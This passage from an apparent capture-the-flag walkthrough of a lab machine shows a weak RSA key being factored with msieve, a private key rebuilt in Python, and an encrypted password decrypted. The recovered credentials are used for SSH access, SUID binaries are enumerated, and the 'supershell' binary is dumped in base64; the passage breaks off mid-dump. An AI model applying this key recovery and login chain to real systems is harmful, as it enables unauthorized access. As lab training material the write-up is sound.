copying build/lib.linux-x86_64-2.7/libnum/chains/__init__.py -> /usr/local/lib/python2.7/dist-packages/libnum/chains
copying build/lib.linux-x86_64-2.7/libnum/chains/chain.py -> /usr/local/lib/python2.7/dist-packages/libnum/chains
copying build/lib.linux-x86_64-2.7/libnum/chains/sqrt.py -> /usr/local/lib/python2.7/dist-packages/libnum/chains
copying build/lib.linux-x86_64-2.7/libnum/factorize.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/ecc.py -> /usr/local/lib/python2.7/dist-packages/libnum
copying build/lib.linux-x86_64-2.7/libnum/primes.py -> /usr/local/lib/python2.7/dist-packages/libnum
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/ranges.py to ranges.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/common.py to common.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/__init__.py to __init__.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/modular.py to modular.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/sqrtmod.py to sqrtmod.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/strings.py to strings.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/stuff.py to stuff.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/chains/__init__.py to __init__.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/chains/chain.py to chain.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/chains/sqrt.py to sqrt.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/factorize.py to factorize.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/ecc.py to ecc.pyc
byte-compiling /usr/local/lib/python2.7/dist-packages/libnum/primes.py to primes.pyc
running install_egg_info
Writing /usr/local/lib/python2.7/dist-packages/libnum-1.4.egg-info
root@kali:~/charon/RsaCtfTool/libnum#
```

```sh
root@kali:~/charon/RsaCtfTool# python RsaCtfTool.py --publickey ../decoder.pub --uncipher ../pass.crypt
[+] Clear text : ��1��6�nevermindthebollocks
root@kali:~/charon/RsaCtfTool#
```

[`msieve-1.53`](https://sourceforge.net/projects/msieve/)

```sh
root@kali:~/charon# cd msieve-1.53/
root@kali:~/charon/msieve-1.53# make all
root@kali:~/charon/msieve-1.53# ./msieve -h

Msieve v. 1.53 (SVN Unversioned directory)

usage: ./msieve [options] [one_number]

numbers starting with '0' are treated as octal,
numbers starting with '0x' are treated as hexadecimal

options:
   -s <name> save intermediate results to <name>
             instead of the default msieve.dat
   -l <name> append log information to <name>
             instead of the default msieve.log
   -i <name> read one or more integers to factor from
             <name> (default worktodo.ini) instead of
             from the command line
   -m        manual mode: enter numbers via standard input
   -q        quiet: do not generate any log information,
             only print any factors found
   -d <min>  deadline: if still sieving after <min>
             minutes, shut down gracefully (default off)
   -r <num>  stop sieving after finding <num> relations
   -p        run at idle priority
   -v        verbose: write log information to screen
             as well as to logfile
   -z        you are Paul Zimmermann
   -t <num>  use at most <num> threads

 elliptic curve options:
   -e        perform 'deep' ECM, seek factors > 15 digits

 quadratic sieve options:
   -c        client: only perform sieving

 number field sieve options:

           [nfs_phase] "arguments"

 where the first part is one or more of:
   -n        use the number field sieve (80+ digits only;
             performs all NFS tasks in order)
   -nf <name> read from / write to NFS factor base file
             <name> instead of the default msieve.fb
   -np       perform only NFS polynomial selection
   -np1      perform stage 1 of NFS polynomial selection
   -nps      perform NFS polynomial size optimization
   -npr      perform NFS polynomial root optimization
   -ns       perform only NFS sieving
   -nc       perform only NFS combining (all phases)
   -nc1      perform only NFS filtering
   -nc2      perform only NFS linear algebra
   -ncr      perform only NFS linear algebra, restarting
             from a previous checkpoint
   -nc3      perform only NFS square root

 the arguments are a space-delimited list of:
 polynomial selection options:
   polydegree=X    select polynomials with degree X
   min_coeff=X     minimum leading coefficient to search
                   in stage 1
   max_coeff=X     maximum leading coefficient to search
                   in stage 1
   stage1_norm=X   the maximum norm value for stage 1
   stage2_norm=X   the maximum norm value for stage 2
   min_evalue=X    the minimum score of saved polyomials
   poly_deadline=X stop searching after X seconds (0 means
                   search forever)
   X,Y             same as 'min_coeff=X max_coeff=Y'
 line sieving options:
   X,Y             handle sieve lines X to Y inclusive
 filtering options:
   filter_mem_mb=X  try to limit filtering memory use to
                    X megabytes
   filter_maxrels=X limit the filtering to using the first
                    X relations in the data file
   filter_lpbound=X have filtering start by only looking
                    at ideals of size X or larger
   target_density=X attempt to produce a matrix with X
                    entries per column
   X,Y              same as 'filter_lpbound=X filter_maxrels=Y'
 linear algebra options:
   skip_matbuild=1  start the linear algebra but skip building
                    the matrix (assumes it is built already)
   la_block=X       use a block size of X (512<=X<=65536)
   la_superblock=X  use a superblock size of X
   cado_filter=1    assume filtering used the CADO-NFS suite
 square root options:
   dep_first=X start with dependency X, 1<=X<=64
   dep_last=Y  end with dependency Y, 1<=Y<=64
   X,Y         same as 'dep_first=X dep_last=Y'
root@kali:~/charon/msieve-1.53#
```

```sh
root@kali:~/charon/msieve-1.53# ./msieve n = 85161183100445121230463008656121855194098040675901982832345153586114585729131

sieving in progress (press Ctrl-C to pause)
36557 relations (19399 full + 17158 combined from 188916 partial), need 36360
sieving complete, commencing postprocessing
root@kali:~/charon/msieve-1.53#
```

```sh
root@kali:~/charon/msieve-1.53# less msieve.log
```

![](images/48.png)

```sh
root@kali:~/charon# python
Python 2.7.15rc1 (default, Apr 15 2018, 21:51:34)
[GCC 7.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.PublicKey import RSA
>>> f = open("decoder.pub", "r")
>>> key = RSA.importKey(f.read())
>>> print key.e
65537
>>> print key.n
85161183100445121230463008656121855194098040675901982832345153586114585729131
>>>
```

`genKey.py`

```python
from Crypto.PublicKey import RSA

n = 85161183100445121230463008656121855194098040675901982832345153586114585729131
e = 65537
p = 280651103481631199181053614640888768819
q = 303441468941236417171803802700358403049
m = n-(p+q-1)

# multiplicative inverse function
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

d = modinv(e,m)
key = RSA.construct((n,long(e),d,p,q))
print key.exportKey()
```

```sh
root@kali:~/charon# python genKey.py
-----BEGIN RSA PRIVATE KEY-----
MIGsAgEAAiEAvEeFgY9UxibHe/Mls88ARrXQ0RNetXeYj3AmLOYUmGsCAwEAAQIg
LvuiAxyjSPcwXGvmgqIrLQxWT1SAKVZwewy/gpO2bKECEQDTI2+4s2LacjlWAWZA
A2kzAhEA5Eizfe3idizLLBr0vsjD6QIRALlM92clYJOQ/csCjWeO1ssCEQDHxRNG
BVGjRsm5XBGHj1tZAhEAkJAmnUZ7ivTvKY17SIkqPQ==
-----END RSA PRIVATE KEY-----
root@kali:~/charon#
```

```sh
root@kali:~/charon# python genKey.py > decoder.priv
root@kali:~/charon# openssl rsautl -decrypt -inkey decoder.priv < pass.crypt
nevermindthebollocks
root@kali:~/charon#
```

###### Privilege Escalation

```sh
root@kali:~/charon/RsaCtfTool# ssh decoder@10.10.10.31
The authenticity of host '10.10.10.31 (10.10.10.31)' can't be established.
ECDSA key fingerprint is SHA256:V1uA1jbcL+1r8UE/foqVjb2u9rSiGTP6EB1Q374Zp9o.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.31' (ECDSA) to the list of known hosts.
decoder@10.10.10.31's password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
23 updates are security updates.


$ id
uid=1001(decoder) gid=1001(freeeze) groups=1001(freeeze)
$ pwd
/home/decoder
$ ls -l
total 12
-rw-r--r-- 1 decoder freeeze 138 Jun 23  2017 decoder.pub
-rw-r--r-- 1 decoder freeeze  32 Jun 23  2017 pass.crypt
-r-------- 1 decoder freeeze  33 Jun 23  2017 user.txt
$ cat user.txt
0fab3fb74e821f8ad05ee35b27f0d75e
$ find / -perm -4000 2>/dev/null
/usr/local/bin/supershell
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/newuidmap
/bin/ntfs-3g
/bin/ping6
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
$
```

###### Binary Exploitation

```sh
$ /usr/local/bin/supershell
Supershell (very beta)
usage: supershell <cmd>
$
```

```sh
$ base64 /usr/local/bin/supershell
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
C3cIgAA/GjsqMyQiAAAAACQAAABEAAAADv3//1kAAAAAQQ4QhgJDDQZFgwMCTwwHCAAAAAAAAAAc
AAAAbAAAAD/9//8EAQAAAEEOEIYCQw0GAv8MBwgAAEQAAACMAAAAMP7//2UAAAAAQg4QjwJCDhiO
A0UOII0EQg4ojAVIDjCGBkgOOIMHTQ5Acg44QQ4wQQ4oQg4gQg4YQg4QQg4IABQAAADUAAAAWP7/
/wIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAsAdAAAAAAACQB0AAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAA
8AVAAAAAAAANAAAAAAAAALQJQAAAAAAAGQAAAAAAAAAQDmAAAAAAABsAAAAAAAAACAAAAAAAAAAa
AAAAAAAAABgOYAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAJAAAAAAAAFAAAAAAAAAPAD
QAAAAAAABgAAAAAAAAC4AkAAAAAAAAoAAAAAAAAAkQAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAA
AAAAAAAAAAAAAAAAAAMAAAAAAAAAABBgAAAAAAACAAAAAAAAAAgBAAAAAAAAFAAAAAAAAAAHAAAA
AAAAABcAAAAAAAAA6ARAAAAAAAAHAAAAAAAAANAEQAAAAAAACAAAAAAAAAAYAAAAAAAAAAkAAAAA
AAAAGAAAAAAAAAD+//9vAAAAAKAEQAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAggRAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgOYAAAAAAA
AAAAAAAAAAAAAAAAAAAAACYGQAAAAAAANgZAAAAAAABGBkAAAAAAAFYGQAAAAAAAZgZAAAAAAAB2
BkAAAAAAAIYGQAAAAAAAlgZAAAAAAACmBkAAAAAAALYGQAAAAAAAxgZAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAR0NDOiAoVWJ1bnR1IDUuNC4wLTZ1YnVudHUxfjE2LjA0LjQpIDUuNC4wIDIwMTYwNjA5
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCQAAAAAAAAAAAAAAAAAAAAAAA
AwACAFQCQAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCQAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCQAAA
AAAAAAAAAAAAAAAAAAAAAwAFALgCQAAAAAAAAAAAAAAAAAAAAAAAAwAGAPADQAAAAAAAAAAAAAAA
AAAAAAAAAwAHAIIEQAAAAAAAAAAAAAAAAAAAAAAAAwAIAKAEQAAAAAAAAAAAAAAAAAAAAAAAAwAJ
ANAEQAAAAAAAAAAAAAAAAAAAAAAAAwAKAOgEQAAAAAAAAAAAAAAAAAAAAAAAAwALAPAFQAAAAAAA
AAAAAAAAAAAAAAAAAwAMABAGQAAAAAAAAAAAAAAAAAAAAAAAAwANANAGQAAAAAAAAAAAAAAAAAAA
AAAAAwAOAOAGQAAAAAAAAAAAAAAAAAAAAAAAAwAPALQJQAAAAAAAAAAAAAAAAAAAAAAAAwAQAMAJ
QAAAAAAAAAAAAAAAAAAAAAAAAwARABQKQAAAAAAAAAAAAAAAAAAAAAAAAwASAFAKQAAAAAAAAAAA
AAAAAAAAAAAAAwATABAOYAAAAAAAAAAAAAAAAAAAAAAAAwAUABgOYAAAAAAAAAAAAAAAAAAAAAAA
AwAVACAOYAAAAAAAAAAAAAAAAAAAAAAAAwAWACgOYAAAAAAAAAAAAAAAAAAAAAAAAwAXAPgPYAAA
AAAAAAAAAAAAAAAAAAAAAwAYAAAQYAAAAAAAAAAAAAAAAAAAAAAAAwAZAHAQYAAAAAAAAAAAAAAA
AAAAAAAAAwAaAIAQYAAAAAAAAAAAAAAAAAAAAAAAAwAbAAAAAAAAAAAAAAAAAAAAAAABAAAABADx
/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAVACAOYAAAAAAAAAAAAAAAAAAZAAAAAgAOABAHQAAAAAAA
AAAAAAAAAAAbAAAAAgAOAFAHQAAAAAAAAAAAAAAAAAAuAAAAAgAOAJAHQAAAAAAAAAAAAAAAAABE
AAAAAQAaAIAQYAAAAAAAAQAAAAAAAABTAAAAAQAUABgOYAAAAAAAAAAAAAAAAAB6AAAAAgAOALAH
QAAAAAAAAAAAAAAAAACGAAAAAQATABAOYAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAA
AAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACpAAAAAQASAGgLQAAAAAAAAAAAAAAAAAC3AAAA
AQAVACAOYAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADDAAAAAAATABgOYAAA
AAAAAAAAAAAAAADUAAAAAQAWACgOYAAAAAAAAAAAAAAAAADdAAAAAAATABAOYAAAAAAAAAAAAAAA
AADwAAAAAAARABQKQAAAAAAAAAAAAAAAAAADAQAAAQAYAAAQYAAAAAAAAAAAAAAAAAAZAQAAEgAO
ALAJQAAAAAAAAgAAAAAAAAApAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAA+AQAAEgAAAAAAAAAAAAAA
AAAAAAAAAABTAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAmAgAAIAAZAHAQYAAAAAAAAAAAAAAAAABv
AQAAEgAAAAAAAAAAAAAAAAAAAAAAAACBAQAAEAAZAIAQYAAAAAAAAAAAAAAAAAAjAQAAEgAPALQJ
QAAAAAAAAAAAAAAAAACIAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACcAQAAEgAAAAAAAAAAAAAAAAAA
AAAAAAC4AQAAEgAAAAAAAAAAAAAAAAAAAAAAAADMAQAAEgAAAAAAAAAAAAAAAAAAAAAAAADgAQAA
EgAOANYHQAAAAAAAWQAAAAAAAADwAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAAFAgAAEgAAAAAAAAAA
AAAAAAAAAAAAAAAkAgAAEAAZAHAQYAAAAAAAAAAAAAAAAAAxAgAAIAAAAAAAAAAAAAAAAAAAAAAA
AABAAgAAEQIZAHgQYAAAAAAAAAAAAAAAAABNAgAAEQAQAMAJQAAAAAAABAAAAAAAAABcAgAAEgAO
AEAJQAAAAAAAZQAAAAAAAADPAAAAEAAaAIgQYAAAAAAAAAAAAAAAAAAqAgAAEgAOAOAGQAAAAAAA
KgAAAAAAAABsAgAAEAAaAIAQYAAAAAAAAAAAAAAAAAB4AgAAEgAOAC8IQAAAAAAABAEAAAAAAAB9
AgAAIAAAAAAAAAAAAAAAAAAAAAAAAACRAgAAEgAAAAAAAAAAAAAAAAAAAAAAAACjAgAAEQIZAIAQ
YAAAAAAAAAAAAAAAAACvAgAAIAAAAAAAAAAAAAAAAAAAAAAAAADJAgAAEgAAAAAAAAAAAAAAAAAA
AAAAAABmAgAAEgALAPAFQAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBfX0pDUl9MSVNUX18AZGVy
ZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC43NTg1AF9f
ZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVf
ZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBzLmMAX19GUkFNRV9FTkRfXwBfX0pDUl9FTkRfXwBfX2lu
aXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9I
RFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBzdHJuY3B5QEBHTElCQ18y
LjIuNQBzdHJuY21wQEBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAcHV0
c0BAR0xJQkNfMi4yLjUAX2VkYXRhAHN0cmxlbkBAR0xJQkNfMi4yLjUAX19zdGFja19jaGtfZmFp
bEBAR0xJQkNfMi40AHN5c3RlbUBAR0xJQkNfMi4yLjUAcHJpbnRmQEBHTElCQ18yLjIuNQB0b250
b19jaGlfbGVnZ2UAc3RyY3NwbkBAR0xJQkNfMi4yLjUAX19saWJjX3N0YXJ0X21haW5AQEdMSUJD
XzIuMi41AF9fZGF0YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGlu
X3VzZWQAX19saWJjX2NzdV9pbml0AF9fYnNzX3N0YXJ0AG1haW4AX0p2X1JlZ2lzdGVyQ2xhc3Nl
cwBleGl0QEBHTElCQ18yLjIuNQBfX1RNQ19FTkRfXwBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxl
AHNldHVpZEBAR0xJQkNfMi4yLjUAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmludGVycAAu
bm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3Ry
AC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5w
bHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRf
YXJyYXkALmZpbmlfYXJyYXkALmpjcgAuZHluYW1pYwAuZ290LnBsdAAuZGF0YQAuYnNzAC5jb21t
ZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAGwAAAAEAAAACAAAAAAAAADgCQAAAAAAAOAIAAAAAAAAcAAAAAAAA
AAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACMAAAAHAAAAAgAAAAAAAABUAkAAAAAAAFQCAAAAAAAA
IAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAxAAAABwAAAAIAAAAAAAAAdAJAAAAAAAB0
AgAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAPb//28CAAAAAAAAAJgC
QAAAAAAAmAIAAAAAAAAcAAAAAAAAAAUAAAAAAAAACAAAAAAAAAAAAAAAAAAAAE4AAAALAAAAAgAA
AAAAAAC4AkAAAAAAALgCAAAAAAAAOAEAAAAAAAAGAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABWAAAA
AwAAAAIAAAAAAAAA8ANAAAAAAADwAwAAAAAAAJEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAA
AAAAXgAAAP///28CAAAAAAAAAIIEQAAAAAAAggQAAAAAAAAaAAAAAAAAAAUAAAAAAAAAAgAAAAAA
AAACAAAAAAAAAGsAAAD+//9vAgAAAAAAAACgBEAAAAAAAKAEAAAAAAAAMAAAAAAAAAAGAAAAAQAA
AAgAAAAAAAAAAAAAAAAAAAB6AAAABAAAAAIAAAAAAAAA0ARAAAAAAADQBAAAAAAAABgAAAAAAAAA
BQAAAAAAAAAIAAAAAAAAABgAAAAAAAAAhAAAAAQAAABCAAAAAAAAAOgEQAAAAAAA6AQAAAAAAAAI
AQAAAAAAAAUAAAAYAAAACAAAAAAAAAAYAAAAAAAAAI4AAAABAAAABgAAAAAAAADwBUAAAAAAAPAF
AAAAAAAAGgAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACJAAAAAQAAAAYAAAAAAAAAEAZA
AAAAAAAQBgAAAAAAAMAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAlAAAAAEAAAAGAAAA
